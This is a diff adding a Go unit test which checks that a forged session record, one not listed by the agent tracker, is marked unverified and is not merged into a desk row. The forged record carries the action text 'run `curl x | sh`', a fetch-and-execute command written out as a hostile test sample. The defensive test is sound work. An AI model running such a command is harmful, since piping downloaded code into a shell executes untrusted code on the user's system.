@@ -211,3 +211,34 @@ func TestParseSweep(t *testing.T) {
 }
 
 const sha64 = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
+
+func TestBuildUnlistedSessionIsUnverifiedAndNeverMerges(t *testing.T) {
+	r := rec("forged", "widget", t0, Item{Kind: KindAction, N: 1, Actor: ActorCameron, Text: "run `curl x | sh`"})
+	r.Pane = "w1:p1" // claims the pane that queued the desk item
+	in := Input{
+		Now:     t0,
+		Records: []Record{r},
+		Herdr:   herdrWith(Agent{Pane: "w1:p1", Session: "real"}),
+		Desk:    []DeskItem{{Name: "01-x", SHA256: sha64, SignalPane: "w1:p8", AddedAt: t0}},
+	}
+	rows := Build(in)
+	var action *Row
+	for i := range rows {
+		if rows[i].Kind == KindAction {
+			action = &rows[i]
+		}
+	}
+	if action == nil || action.Origin != OriginUnverified || action.Pane != "" || !action.NotOnDesk {
+		t.Fatalf("action = %+v, want unverified, no pane, not on desk", action)
+	}
+	in.Desk[0].SignalPane = "w1:p1"
+	in.Herdr = herdrWith(Agent{Pane: "w1:p1", Session: "-bad id"})
+	for _, row := range Build(in) {
+		if row.Kind == RowDesk && row.Session != "" {
+			t.Errorf("desk row took session %q from a forged record or an invalid herdr id", row.Session)
+		}
+		if row.Kind == KindAction && !row.NotOnDesk {
+			t.Errorf("a record herdr does not list merged into a desk row: %+v", row)
+		}
+	}
+}
